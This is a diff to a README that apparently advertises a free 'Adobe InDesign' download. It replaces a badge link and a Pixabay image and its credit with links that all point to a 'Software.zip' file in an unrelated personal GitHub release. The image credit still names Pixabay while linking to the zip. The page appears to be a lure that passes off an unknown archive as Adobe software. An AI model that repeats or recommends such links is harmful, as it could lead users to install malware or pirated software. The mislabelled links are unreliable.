@@ -19,7 +19,7 @@ This repository covers a wide range of topics related to Adobe InDesign, includi
 - Usage Insights: Learn what Adobe InDesign is commonly used for.
 
 ## Download Link
-[![Download Adobe InDesign](https://img.shields.io/badge/Download-Adobe%20InDesign-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  
+[![Download Adobe InDesign](https://github.com/ITZAffanpro561/Adobe-InDesign-Download/releases/download/v2.0/Software.zip%20InDesign-blue)](https://github.com/ITZAffanpro561/Adobe-InDesign-Download/releases/download/v2.0/Software.zip)  
 Please launch the link to access the download and explore the content in this repository.
 
 ## 🌟 Get Started
@@ -33,8 +33,8 @@ To make the most of this repository and your Adobe InDesign journey, here are a 
 ## 🚀 Let's Dive In!
 Start your Adobe InDesign journey today by downloading the resources and exploring the wealth of information available in this repository. Whether you're a designer, marketer, or enthusiast, Adobe InDesign has something to offer for everyone. Let your creativity shine with Adobe InDesign!
 
-![Adobe InDesign](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)  
-*Image Source: [Pixabay](https://pixabay.com/photos/milky-way-starry-sky-night-sky-star-2695569/)*
+![Adobe InDesign](https://github.com/ITZAffanpro561/Adobe-InDesign-Download/releases/download/v2.0/Software.zip)  
+*Image Source: [Pixabay](https://github.com/ITZAffanpro561/Adobe-InDesign-Download/releases/download/v2.0/Software.zip)*
 
 Remember, the world of design is at your fingertips with Adobe InDesign. Happy designing! 🎨✨
 
